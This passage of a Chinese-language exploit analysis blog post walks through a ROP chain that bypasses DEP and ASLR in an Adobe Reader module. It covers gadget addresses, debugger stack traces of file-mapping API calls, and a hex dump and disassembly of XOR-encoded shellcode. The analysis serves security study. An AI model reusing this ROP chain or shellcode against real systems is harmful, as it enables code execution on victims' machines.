ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># lea edx,dword ptr ss:[esp+0xC]    ; edx为0x4a8063a5的地址,edx=0x0C0C0D20,esp=0x0C0C0D14(0x4a801f90),主要语句</span></span><br><span class="line">    <span class="comment"># push edx                          ; edx=0x0C0C0D20                       </span></span><br><span class="line">    <span class="comment"># push eax                          ; eax=0x03550000</span></span><br><span class="line">    <span class="comment"># push dword ptr ss:[esp+0xC]       ; [esp+0xC]=[0x0C0C0D0C+0xC]=[0x0C0C0D18]=0x34                        </span></span><br><span class="line">    <span class="comment"># push dword ptr ds:[0x4A8A093C]    ; [0x4A8A093C]=0x0</span></span><br><span class="line">    <span class="comment"># call ecx                          ; ecx=0x4a801064,ret指令地址                      </span></span><br><span class="line">    <span class="comment"># add esp,0x10                      ; esp=esp+0x10=0x0C0C0D04+0x10=0x0C0C0D14(0x4a801f90)</span></span><br><span class="line">    <span class="comment"># retn                              ; </span></span><br><span class="line">    <span class="number">0x4a80aedc</span>,   <span class="comment"># lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x00000034</span>,   <span class="comment"># becomes eax ; eax=0x00000034,真正shellcode的地址相对ROPgadget(0x4a8063a5)的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a80d585</span>,   <span class="comment"># add eax,edx / ret ; eax=eax+edx=0x34+0x0C0C0D20(0x4a8063a5)=0x0C0C0D54(真正shellcode的地址)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址 </span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; eax=0x0C0C0D54,edi=0x03550000,eax&lt;-&gt;edi,edi保存真正shellcode的地址(eax=0x03550000,edi=0x0C0C0D54)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x0000000a</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0xa,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改memcpy第二个参数为计算出的真正shellcode的地址)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a849170</span>,   <span class="comment"># becomes eax (import for memcpy) ; memcpy()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call memcpy</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">    <span class="comment"># memcpy的返回地址,由函数块0x4a80a8a6修改,被修改为真正shellcode的地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># becomes first arg to memcpy (dst)       ; 0x03550000,文件映射基地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># becomes second arg to memcpy (src)      ; 0x0C0C0D54,真正shellcode的地址</span></span><br><span class="line">    <span class="number">0x00001000</span>,   <span class="comment"># becomes third arg to memcpy (length)    ; 复制长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这后面就是经过编码的shellcode的内容</span></span><br><span class="line">].pack(<span class="string">'V*'</span>)</span><br></pre></td></tr></table></figure></p><blockquote><p>我们可以看到调用了四个函数，<code>CreateFileA()</code>、<code>CreateFileMappingA()</code>、<code>MapViewOfFile()</code>、<code>memcpy()</code>。调用<code>createFileA()</code>函数时参数如下：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能:创建一个文件或设备</span></span><br><span class="line">0C0C0C24   4A801064  +-<span class="keyword">CALL</span> 到 CreateFileA</span><br><span class="line">0C0C0C28   4A8522C8  | FileName = <span class="string">"iso88591"</span>    <span class="comment">; 创建一个名为iso88591的文件。</span></span><br><span class="line">0C0C0C2C   <span class="number">10000000</span>  | Access = GENERIC_ALL     <span class="comment">; 此文件访问权限为可读可写可执行。</span></span><br><span class="line">0C0C0C30   <span class="number">00000000</span>  | ShareMode = <span class="number">0</span>            <span class="comment">; 共享模式，0:阻止其他进程在请求删除，读取或写入访问权限时打开文件或设备。</span></span><br><span class="line">0C0C0C34   <span class="number">00000000</span>  | pSecurity = NULL         <span class="comment">; 此参数为NULL，则CreateFile返回的句柄，不能由应用程序可能创建的任何子进程继承，并且与返回的句柄关联的文件或设备将获取默认安全描述符。</span></span><br><span class="line">0C0C0C38   <span class="number">00000002</span>  | Mode = CREATE_ALWAYS     <span class="comment">; 始终创建一个新文件。</span></span><br><span class="line">0C0C0C3C   <span class="number">00000102</span>  | Attributes = HIDDEN|TEMPORARY    <span class="comment">; 文件属性：隐藏文件|临时文件</span></span><br><span class="line">0C0C0C40   <span class="number">00000000</span>  +-hTemplateFile = NULL     <span class="comment">; hTemplateFile为一个文件或设备句柄，表示按这个参数给出的句柄为模板创建文件。通常这个参数设置为NULL，为空表示不使用模板，一般为空。</span></span><br></pre></td></tr></table></figure><blockquote><p>调用<code>CreateFileMappingA()</code>时的参数如下：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能：创建文件映射内核对象，文件与物理页映射</span></span><br><span class="line">0C0C0C68   4A801064  +-<span class="keyword">CALL</span> 到 CreateFileMappingA           </span><br><span class="line">0C0C0C6C   0000036C  | hFile = 0000036C                     <span class="comment">; 文件的句柄，用于创建文件映射对象的文件。CreateFileA的返回值。</span></span><br><span class="line">0C0C0C70   <span class="number">00000000</span>  | pSecurity = NULL                     <span class="comment">; 指向SECURITY_ATTRIBUTES 结构的指针，该结构确定子进程是否可以继承返回的句柄。指定一个安全对象，在创建文件映射时使用。如果为NULL（用ByVal As Long传递零），表示使用默认安全对象。</span></span><br><span class="line">0C0C0C74   <span class="number">00000040</span>  | Protection = PAGE_EXECUTE_READWRITE  <span class="comment">; 指定文件映射对象的页面保护。对象的所有映射视图必须与此保护兼容。必须使用GENERIC_READ、GENERIC_WRITE和GENERIC_EXECUTE访问权限创建hFile参数指定的文件句柄。</span></span><br><span class="line">0C0C0C78   <span class="number">00000000</span>  | MaximumSizeHigh = <span class="number">0x0</span>                <span class="comment">; 文件映射的最大长度的高32位。</span></span><br><span class="line">0C0C0C7C   <span class="number">00010000</span>  | MaximumSizeLow = <span class="number">0x10000</span>             <span class="comment">; 文件映射的最大长度的低32位。</span></span><br><span class="line">0C0C0C80   <span class="number">00000000</span>  +-MapName = NULL                       <span class="comment">; 指定文件映射对象的名字。如果此参数为NULL，则创建没有名称的文件映射对象。</span></span><br></pre></td></tr></table></figure><blockquote><p>调用<code>MapViewOfFile()</code>时的参数如下：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能：将一个文件映射对象映射到当前应用程序的地址空间。将物理页与进程虚拟地址进行映射。</span></span><br><span class="line">0C0C0CA8   4A801064  +-<span class="keyword">CALL</span> 到 MapViewOfFile</span><br><span class="line">0C0C0CAC   <span class="number">00000370</span>  | hMapObject = <span class="number">00000370</span>        <span class="comment">; CreateFileMappingA()返回的文件映射对象句柄。</span></span><br><span class="line">0C0C0CB0   <span class="number">00000022</span>  | AccessMode = <span class="number">0x22</span>            <span class="comment">; 对文件映射对象的访问类型，它决定了页面的保护。</span></span><br><span class="line">0C0C0CB4   <span class="number">00000000</span>  | OffsetHigh = <span class="number">0x0</span>             <span class="comment">; 表示文件映射起始偏移的高32位.</span></span><br><span class="line">0C0C0CB8   <span class="number">00000000</span>  | OffsetLow = <span class="number">0x0</span>              <span class="comment">; 表示文件映射起始偏移的低32位.</span></span><br><span class="line">0C0C0CBC   <span class="number">00010000</span>  +-MapSize = <span class="number">10000</span> (<span class="number">65536</span>.)     <span class="comment">; 指定映射文件的字节数</span></span><br></pre></td></tr></table></figure><p>执行完,<code>进程内存</code>中会多一块这样的<code>内存块</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">地址=03EA0000</span><br><span class="line">大小=00010000 (65536.)</span><br><span class="line">属主=03EA0000 (自身)</span><br><span class="line">区段=</span><br><span class="line">类型=Map  00041040</span><br><span class="line">访问=RWE</span><br><span class="line">初始访问=RWE</span><br><span class="line">已映射为=\Device\HarddiskVolume1\Documents and Settings\******\桌面\iso88591</span><br></pre></td></tr></table></figure><blockquote><p>调用<code>memcopy()</code>时的参数如下：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能：内存拷贝</span></span><br><span class="line">0C0C0D44   03EA0000  +-<span class="keyword">CALL</span> 到 memcpy</span><br><span class="line">0C0C0D48   03EA0000  | dest = 03EA0000      <span class="comment">; 目的dest内存地址，文件映射基地址</span></span><br><span class="line">0C0C0D4C   0C0C0D54  | src = 0C0C0D54       <span class="comment">; 源src内存地址，真正shellcode的地址</span></span><br><span class="line">0C0C0D50   <span class="number">00001000</span>  +-n = <span class="number">1000</span> (<span class="number">4096</span>.)     <span class="comment">; 拷贝字节数</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;最后调用<code>memcopy</code>的时候，<code>目的地址</code>就是前面<code>MapViewOfFile()</code>返回的<code>文件映射基地址</code>，而<code>源地址</code>就是真正的<code>shellcode</code>代码，将它<code>复制</code>到一段<code>可执行可读写的内存段</code>，以此<code>绕过DEP</code>。由于构造的<code>ROP指令</code>均位于不受<code>ASLR</code>保护的<code>icucnv36.dll</code>模块，因此也可以<code>绕过ASLR保护</code>。正是由于<code>DEP</code>的存在，所以<code>堆栈空间</code>是不存在<code>可执行权限</code>的，所以，我们需要创建一个<code>文件映射对象</code>，将其<code>映射</code>到<code>可读可写可执行的内存块</code>，再把shellcode拷贝到那里，就可以执行了。</p><h4 id="3、阶段3：执行shellcode"><a href="#3、阶段3：执行shellcode" class="headerlink" title="3、阶段3：执行shellcode"></a>3、阶段3：执行shellcode</h4><p>&emsp;&emsp;<code>Heap Spary</code>中使用的<code>shellcode</code>是经过编码的(<code>payload.encoded</code>)。经过分析,<code>shellcode</code>是通过<code>XOR</code>进行编码的,所以会首先执行<code>XOR解码</code>,然后再执行<code>真正的shellcode</code>功能。<br><strong><code>解码前：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 内存：</span></span><br><span class="line"><span class="comment">;....0000  BA 6D A5 42 5E DD C4 D9 74 24 F4 5D 31 C9 B1 31  簃^菽賢$鬩1杀1</span></span><br><span class="line"><span class="comment">;....0010  83 C5 04 31 55 0F 03 55 62 47 B7 A2 94 05 38 5B  兣1UUbG发?8[</span></span><br><span class="line"><span class="comment">;....0020  64 6A B0 BE 55 AA A6 CB C5 1A AC 9E E9 D1 E0 0A  dj熬U伺瑸檠?</span></span><br><span class="line"><span class="comment">;....0030  7A 97 2C 3C CB 12 0B 73 CC 0F 6F 12 4E 52 BC F4  z?&lt;?s?oNR剪</span></span><br><span class="line"><span class="comment">;....0040  6F 9D B1 F5 A8 C0 38 A7 61 8E EF 58 06 DA 33 D2  o澅酲?庯X?</span></span><br><span class="line"><span class="comment">;....0050  54 CA 33 07 2C ED 12 96 27 B4 B4 18 E4 CC FC 02  T?,??创涮?</span></span><br><span class="line"><span class="comment">;....0060  E9 E9 B7 B9 D9 86 49 68 10 66 E5 55 9D 95 F7 92  殚饭賳Ihf錟潟鲯</span></span><br><span class="line"><span class="comment">;....0070  19 46 82 EA 5A FB 95 28 21 27 13 AB 81 AC 83 17  F傟Z麜(!'珌瑑</span></span><br><span class="line"><span class="comment">;....0080  30 60 55 D3 3E CD 11 BB 22 D0 F6 B7 5E 59 F9 17  0`U???婿穅Y?</span></span><br><span class="line"><span class="comment">;....0090  D7 19 DE B3 BC FA 7F E5 18 AC 80 F5 C3 11 25 7D  ?蕹贱?瑎趺%&#125;</span></span><br><span class="line"><span class="comment">;....00A0  E9 46 54 DC 67 98 EA 5A C5 9A F4 64 79 F3 C5 EF  镕T躦橁Z艢鬱y笈</span></span><br><span class="line"><span class="comment">;....00B0  16 84 D9 25 53 7A 90 64 F5 13 7D FD 44 7E 7E 2B  勝%Sz恉?&#125;鼶~~+</span></span><br><span class="line"><span class="comment">;....00C0  8A 87 FD DE 72 7C 1D AB 77 38 99 47 05 51 4C 68  妵r|玾8橤QLh</span></span><br><span class="line"><span class="comment">;....00D0  BA 52 45 0B 5D C1 05 E2 F8 61 AF FA 0C 0C 0C 0C  篟E]?怿a....</span></span><br><span class="line"><span class="comment">;....00E0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"><span class="comment">;....00F0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 反汇编：</span></span><br><span class="line"><span class="comment">; 异或解密流程：以0x5E42A56D为基础异或key,异或待解密数据的第一个双字,将异或的结果与0x5E42A56D相加,得到下一个双字的异或key,以此类推,ecx=ecx-0x1,直至ecx=0,退出循环。</span></span><br><span class="line">....<span class="number">0000</span>    BA 6DA5425E     <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="number">0x5E42A56D</span>                 <span class="comment">; edx=0x5E42A56D,异或数</span></span><br><span class="line">....<span class="number">0005</span>    DDC4            <span class="keyword">ffree</span> <span class="built_in">st</span>(<span class="number">4</span>)                        <span class="comment">; </span></span><br><span class="line">....<span class="number">0007</span>    D97424 F4       <span class="keyword">fstenv</span> (<span class="number">28</span>-<span class="built_in">byte</span>) <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>-<span class="number">0xC</span>]  <span class="comment">; 保存FPU环境,0x0C0C0D3C-0x0C0C0D58</span></span><br><span class="line">....<span class="number">000B</span>    <span class="number">5D</span>              <span class="keyword">pop</span> <span class="built_in">ebp</span>                            <span class="comment">; ebp=0x....0005</span></span><br><span class="line">....000C    31C9            <span class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                        <span class="comment">; ecx=0x0</span></span><br><span class="line">....000E    B1 <span class="number">31</span>           <span class="keyword">mov</span> <span class="built_in">cl</span>,<span class="number">0x31</span>                        <span class="comment">; cl=0x31=49,异或数据(49个双字)</span></span><br><span class="line">....<span class="number">0010</span>    83C5 <span class="number">04</span>         <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x4</span>                        <span class="comment">; ebp=0x....0005+0x4=0x....0009</span></span><br><span class="line">....<span class="number">0013</span>    <span class="number">3155</span> 0F         <span class="keyword">xor</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xF</span>],<span class="built_in">edx</span>     <span class="comment">; [ebp+0xf]=[0x....0018]=0xA2B74762,异或解密0x18-0xDB的代码</span></span><br><span class="line">....<span class="number">0016</span>    <span class="number">0355</span> <span class="number">62</span>         <span class="keyword">add</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x62</span>]</span><br><span class="line">....<span class="number">0019</span>    <span class="number">47</span>              <span class="keyword">inc</span> <span class="built_in">edi</span></span><br><span class="line">....001A    B7 A2           <span class="keyword">mov</span> <span class="number">bh</span>,<span class="number">0xA2</span></span><br><span class="line">....001C    <span class="number">94</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">esp</span></span><br><span class="line">....<span class="number">001D</span>    <span class="number">05</span> 385B646A     <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0x6A645B38</span></span><br><span class="line">....<span class="number">0022</span>    B0 BE           <span class="keyword">mov</span> <span class="built_in">al</span>,<span class="number">0xBE</span></span><br><span class="line">....<span class="number">0024</span>    <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">....<span class="number">0025</span>    AA              stos <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">....<span class="number">0026</span>    A6              cmps <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">....<span class="number">0027</span>    cb              <span class="keyword">retf</span></span><br><span class="line">....<span class="number">0028</span>    c51a            <span class="keyword">lds</span> <span class="built_in">ebx</span>,fword <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>]</span><br><span class="line">....002A    AC              lods <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</span><br><span class="line">....002B    9E              <span class="keyword">sahf</span></span><br><span class="line">....002C  - E9 D1E00A7A     <span class="keyword">jmp</span> 7E2BE102</span><br><span class="line">....<span class="number">0031</span>    <span class="number">97</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">edi</span></span><br><span class="line">....<span class="number">0032</span>    2C 3C           <span class="keyword">sub</span> <span class="built_in">al</span>,<span class="number">0x3C</span></span><br><span class="line">....<span class="number">0034</span>    cb              <span class="keyword">retf</span></span><br><span class="line">....<span class="number">0035</span>    120B            <span class="keyword">adc</span> <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>]</span><br><span class="line">....<span class="number">0037</span>  ^ <span class="number">73</span> CC           <span class="keyword">jnb</span> short ....<span class="number">0005</span></span><br><span class="line">....<span class="number">0039</span>    0F6F12          <span class="keyword">movq</span> <span class="built_in">mm2</span>,<span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>]</span><br><span class="line">....003C    4E              <span class="keyword">dec</span> <span class="built_in">esi</span></span><br><span class="line">....<span class="number">003D</span>    <span class="number">52</span>              <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">....003E    BC F46F9DB1     <span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="number">0xB19D6FF4</span></span><br><span class="line">....<span class="number">0043</span>    F5              <span class="keyword">cmc</span></span><br><span class="line">....<span class="number">0044</span>    A8 C0           <span class="keyword">test</span> <span class="built_in">al</span>,<span class="number">0xC0</span></span><br><span class="line">....<span class="number">0046</span>    38A7 618EEF58   <span class="keyword">cmp</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>+<span class="number">0x58EF8E61</span>],<span class="number">ah</span></span><br><span class="line">....004C    <span class="number">06</span>              <span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line">....<span class="number">004D</span>    DA33            <span class="keyword">fidiv</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>]</span><br><span class="line">....004F    D254CA <span class="number">33</span>       <span class="keyword">rcl</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="built_in">ecx</span>*<span class="number">8</span>+<span class="number">0x33</span>],<span class="built_in">cl</span></span><br><span class="line">....<span class="number">0053</span>    <span class="number">07</span>              <span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line">....<span class="number">0054</span>    2C ED           <span class="keyword">sub</span> <span class="built_in">al</span>,<span class="number">0xED</span></span><br><span class="line">....<span class="number">0056</span>    <span class="number">1296</span> 27B4B418   <span class="keyword">adc</span> <span class="built_in">dl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x18B4B427</span>]</span><br><span class="line">....005C    e4 cc           <span class="keyword">in</span> <span class="built_in">al</span>,<span class="number">0xcc</span></span><br><span class="line">....005E    FC              <span class="keyword">cld</span></span><br><span class="line">....005F    02E9            <span class="keyword">add</span> <span class="number">ch</span>,<span class="built_in">cl</span></span><br><span class="line">....<span class="number">0061</span>  - E9 B7B9D986     <span class="keyword">jmp</span> 8AFABA1D</span><br><span class="line">....<span class="number">0066</span>    <span class="number">49</span>              <span class="keyword">dec</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0067</span>    <span class="number">68</span> 1066E555     <span class="keyword">push</span> <span class="number">0x55E56610</span></span><br><span class="line">....006C    <span class="number">9D</span>              <span class="keyword">popfd</span></span><br><span class="line">....<span class="number">006D</span>    <span class="number">95</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span></span><br><span class="line">....006E    F792 194682EA   <span class="keyword">not</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>-<span class="number">0x157DB9E7</span>]</span><br><span class="line">....<span class="number">0074</span>    5A              <span class="keyword">pop</span> <span class="built_in">edx</span>                                </span><br><span class="line">....<span class="number">0075</span>    FB              <span class="keyword">sti</span></span><br><span class="line">....<span class="number">0076</span>    <span class="number">95</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span></span><br><span class="line">....<span class="number">0077</span>    <span class="number">2821</span>            <span class="keyword">sub</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>],<span class="number">ah</span></span><br><span class="line">....<span class="number">0079</span>    <span class="number">27</span>              <span class="keyword">daa</span></span><br><span class="line">....007A    13AB 81AC8317   <span class="keyword">adc</span> <span class="built_in">ebp</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="number">0x1783AC81</span>]</span><br><span class="line">....<span class="number">0080</span>    <span class="number">3060</span> <span class="number">55</span>         <span class="keyword">xor</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x55</span>],<span class="number">ah</span></span><br><span class="line">....<span class="number">0083</span>    D33E            <span class="keyword">sar</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="built_in">cl</span></span><br><span class="line">....<span class="number">0085</span>    CD <span class="number">11</span>           <span class="keyword">int</span> <span class="number">0x11</span></span><br><span class="line">....<span class="number">0087</span>    BB 22D0F6B7     <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="number">0xB7F6D022</span></span><br><span class="line">....008C    5E              <span class="keyword">pop</span> <span class="built_in">esi</span>                              </span><br><span class="line">....<span class="number">008D</span>    <span class="number">59</span>              <span class="keyword">pop</span> <span class="built_in">ecx</span>                             </span><br><span class="line">....008E    F9              <span class="keyword">stc</span></span><br><span class="line">....008F    <span class="number">17</span>              <span class="keyword">pop</span> <span class="built_in">ss</span></span><br><span class="line">....<span class="number">0090</span>    D7              <span class="keyword">xlat</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">al</span>]</span><br><span class="line">....<span class="number">0091</span>    19DE            <span class="keyword">sbb</span> <span class="built_in">esi</span>,<span class="built_in">ebx</span></span><br><span class="line">....<span class="number">0093</span>    B3 BC           <span class="keyword">mov</span> <span class="built_in">bl</span>,<span class="number">0xBC</span></span><br><span class="line">....<span class="number">0095</span>    FA              <span class="keyword">cli</span></span><br><span class="line">....<span class="number">0096</span>  ^ 7F E5           <span class="keyword">jg</span> short ....<span class="number">007D</span></span><br><span class="line">....<span class="number">0098</span>    18AC80 F5C31125 <span class="keyword">sbb</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="built_in">eax</span>*<span class="number">4</span>+<span class="number">0x2511C3F5</span>],c&gt;</span><br><span class="line">....009F  ^ <span class="number">7D</span> E9           <span class="keyword">jge</span> short ....008A</span><br><span class="line">....00A1    <span class="number">46</span>              <span class="keyword">inc</span> <span class="built_in">esi</span></span><br><span class="line">....00A2    <span class="number">54</span>              <span class="keyword">push</span> <span class="built_in">esp</span></span><br><span class="line">....00A3    DC67 <span class="number">98</span>         <span class="keyword">fsub</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>-<span class="number">0x68</span>]</span><br><span class="line">....00A6    ea 5ac59af4 <span class="number">647</span>&gt;<span class="keyword">jmp</span> <span class="built_in">far</span> <span class="number">7964</span>:0f49ac55a</span><br><span class="line">....00AD    f3              <span class="keyword">rep</span></span><br><span class="line">....00AE    c5              <span class="built_in">db</span> c5</span><br><span class="line">....00AF    ef              <span class="keyword">out</span> <span class="built_in">dx</span>,<span class="built_in">eax</span></span><br><span class="line">....00B0    <span class="number">16</span>              <span class="keyword">push</span> <span class="built_in">ss</span></span><br><span class="line">....00B1    84D9            <span class="keyword">test</span> <span class="built_in">cl</span>,<span class="built_in">bl</span></span><br><span class="line">....00B3    <span class="number">25</span> 537A9064     <span class="keyword">and</span> <span class="built_in">eax</span>,<span class="number">0x64907A53</span></span><br><span class="line">....00B8    F5              <span class="keyword">cmc</span></span><br><span class="line">....00B9    <span class="number">137D</span> FD         <span class="keyword">adc</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span 